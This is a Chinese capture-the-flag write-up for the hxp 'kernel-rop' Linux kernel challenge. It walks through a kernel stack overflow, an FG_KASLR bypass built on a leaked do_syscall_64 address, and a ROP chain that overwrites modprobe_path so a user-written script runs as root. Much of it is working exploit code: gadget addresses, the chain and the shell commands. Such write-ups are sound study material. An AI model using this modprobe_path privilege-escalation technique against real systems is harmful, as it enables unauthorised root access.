# hxp200 kernel-rop
## IDA

IDA很简单，存在越界读写，是一个栈溢出问题。

测试发现当读写长度≥0x200时，会报错，最大的size为0x198。

## Mitigation

FG_KASLR: 提高了寻找可用gadget的难度，通过fg_kaslr.py来找到与kernbase偏移不变的gadget。

之后通过kernel-rop完成利用即可。

## 利用

1. 泄漏

hackme_read(fd, rbuf, 0x198)

rbuf[38]为一个不受FG_KASLR干扰的地址，通过这个地址计算出内核基地址。可以发现这个地址是do_syscall_64，因此这个地址并不是巧合。

```c
/ $ grep ffffffff9180a157 /tmp/syms
/ $ grep ffffffff9180a1 /tmp/syms
ffffffff9180a120 T do_syscall_64
```

2. 修改modprobe_path

利用一下几个gadgets:

```c
*rop++ = pop_rax;
*rop++ = 0x00312f706d742f;
*rop++ = pop_rbx;
*rop++ = modprobe_path;
*rop++ = write_rbx_rax;
*rop++ = 0;
*rop++ = 0;
*rop++ = kpti;//swapgs_restore_regs_and_return_to_usermode+0x16
*rop++ = 0;
*rop++ = 0;
*rop++ = (size_t)shell;
*rop++ = user_cs;
*rop++ = user_flags;
*rop++ = user_sp;
*rop++ = user_ss;

size_t pop_rax = 0xffffffff81004d11;//: pop rax ; ret
size_t pop_rbx = 0xffffffff81006158;//: pop rbx ; ret
size_t write_rbx_rax = 0xffffffff8100306d;// : mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret
```

最后通过`swapgs_restore_regs_and_return_to_usermode+0x16`返回到用户态的函数

```c
void shell() {
	system("echo -ne '#!/bin/sh\n/bin/cp /dev/sda /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/1");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/aaa");
	system("chmod +x /tmp/1");
	system("chmod +x /tmp/aaa");
	system("/tmp/aaa");
	system("cat /tmp/flag");
}
```
